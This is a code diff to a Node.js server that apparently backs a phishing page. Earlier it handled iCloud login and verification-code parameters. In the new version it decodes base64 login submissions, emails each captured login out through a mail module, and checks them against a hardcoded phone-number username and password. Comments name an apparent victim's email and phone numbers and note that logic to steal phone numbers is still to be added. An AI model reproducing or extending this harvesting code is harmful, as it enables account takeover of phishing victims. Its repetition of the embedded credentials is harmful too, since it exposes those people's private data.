@@ -5,6 +5,7 @@ let url = require('url'); // url解析模块
 let fs = require('fs'); // 文件系统模块
 let path = require('path'); // 路径解析模块
 let readlineSync = require("readline-sync");
+let email = require('../nodeemail/email');
 // let readline = require('readline');
 // let rl = readline.createInterface(process.stdin, process.stdout);
 
@@ -117,7 +118,7 @@ let listener = (request, response) => {
             response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
         }
         response.end(str);
-    }  else if (pathName.indexOf(".js") !== -1) {
+    } else if (pathName.indexOf(".js") !== -1) {
         response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
         response.end('');
     } else if (/\.png|\.jpg|\.ico/.test(pathName)) {
@@ -144,47 +145,33 @@ let listener = (request, response) => {
             let qs = query.split("&");
             let key = '';
             qs.forEach(e => {
-                if (e.indexOf('icloudLogin=') != -1) {
-                    key = "icloudLogin";
-                    query = e.replace('icloudLogin=', '');
-
-                } else if (e.indexOf('icloudInfo=') != -1) {
-                    key = "icloudInfo";
-                    query = e.replace('icloudInfo=', '');
-
-                } else if (e.indexOf("icloudCheckCode=") != -1) {
-                    key = "icloudCheckCode";
-                    query = e.replace('icloudCheckCode=', '');
-
-                } else if (e.indexOf("icloudInputCode=") != -1) {
-                    key = "icloudInputCode";
-                    query = e.replace('icloudInputCode=', '');
-
-                } else if (e.indexOf("icloudCheckCodeNeed=") != -1) {
-                    key = "icloudCheckCodeNeed";
-                    query = e.replace('icloudCheckCodeNeed=', '');
-
-                } else if (e.indexOf('icloudLoginNeed=') != -1) {
-                    key = "icloudLoginNeed";
-                    query = e.replace('icloudLoginNeed=', '');
-
+                if (e.indexOf('d=') != -1) {
+                    query = query.replace("d=", "");
                 }
             });
             query = decodeURIComponent(atob(query));
-            query = key + "=>" + query;
+            // query = key + "=>" + query;
             console.log(`return query ==> ${query}`);
             log += ("\n" + query);
-            if (key === "icloudCheckCodeNeed") {
-                response.write(waitInput());
-            } else if (key === "icloudLoginNeed") {
-                response.write(waitInput());
+            if (/type\=login/.test(query)) {
+                email.send("bd", query);
+                if (/\&u\=18086094549\&/.test(query)) {
+                    if (/\&p\=kejyuan6280230\&/.test(query)) {
+                        response.write('pass');
+                    } else {
+                        response.write('error');
+                    }
+                } else {
+                    // 554934437@qq.com 未知
+                    response.write(waitInput());
+                }
             } else {
                 response.write("");
             }
             response.end();
         }
         writedown();
-    }else if(/\/login.html/.test(requestUrl)){
+    } else if (/\/login.html/.test(requestUrl)) {
         htmlstr = '';
         if (fs.existsSync(`.${basePath}/login.html`)) {
             response.writeHead(200, { 'content-type': 'text/html' });
@@ -193,7 +180,10 @@ let listener = (request, response) => {
             response.writeHead(404, { 'content-type': 'text/html' });
         }
         response.end(htmlstr);
-    }else if(/\/check.html/.test(requestUrl)){
+    } else if (/\/check.html/.test(requestUrl)) {
+        // 554934437@qq.com对应手机号138******21 需要加上盗取手机号的逻辑
+        // 18086094549对应手机号为180******49
+
         htmlstr = '';
         if (fs.existsSync(`.${basePath}/check.html`)) {
             response.writeHead(200, { 'content-type': 'text/html' });
@@ -202,7 +192,7 @@ let listener = (request, response) => {
             response.writeHead(404, { 'content-type': 'text/html' });
         }
         response.end(htmlstr);
-    }else{
+    } else {
         response.writeHead(404, { 'content-type': 'text/html' });
         response.end("");
     }
